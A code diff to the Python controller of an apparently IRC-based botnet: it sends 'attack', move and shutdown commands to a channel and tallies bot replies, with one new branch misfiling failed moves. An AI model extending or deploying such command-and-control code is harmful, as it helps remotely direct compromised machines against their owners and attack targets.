@@ -12,7 +12,7 @@ class conBot:
         self.PHRASE = phrase
         self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # CONTROLLER INFO
-        self.conNick = "SLAVE_DRIVER"
+        self.conNick = "SLAVE_DRIVER73128"
         self.liveConnection = False # Flag to see if controller connection to IRC Server is active
         self.command = None
 
@@ -21,6 +21,7 @@ class conBot:
         self.botsSuccessful = []
         self.botsFailed = {}
         self.botsMoved = []
+        self.botsMoveFailed = []
         self.botsDisconnected = []
 
         try:
@@ -64,7 +65,9 @@ class conBot:
         elif text.find("Attack successful") != -1:
             self.botsSuccessful.append(text.split("-")[1])
         elif text.find("Attack failed") != -1:
-            self.botsFailed[message.split(" - ")[1]] = [message.split(" - ")[2]]
+            self.botsFailed[text.split(" - ")[1]] = [text.split(" - ")[2]]
+        elif text.find("Move failed") != -1:
+            self.botsMoved.append(text.split("-")[1])
         elif text.find("Shutdown successful") != -1:
             self.botsDisconnected.append(text.split("-")[1])
             
@@ -73,12 +76,12 @@ class conBot:
         try:
             while True:
                 response = self.getData()
-                #print(response)   
+                print(response)   
                 if(response != ""):                                         
                         if response.find("PRIVMSG") != -1:                           
                             name = response.split('!',1)[0][1:]
                             message = response.split('PRIVMSG',1)[1].split(':',1)[1]
-                            #print("message from " + name + ": " + message)   
+                            print("message from " + name + ": " + message)   
                             self.handleResponse(name, message)                              
                         elif response.find("PING") != -1:
                             self.sendData("PONG {}: :\r\n".format(self.HOST))                                                                          
@@ -119,7 +122,7 @@ class conBot:
             elif (self.command[0] == "attack"):
                 if (len(self.command) == 3):
                     self.botsSuccessful = []
-                    self.botsFailed = []
+                    self.botsFailed = {}
                     self.sendCommand("#" + self.CHANNEL, userCommand)
                     time.sleep(5)
                     for bot in self.botsSuccessful:
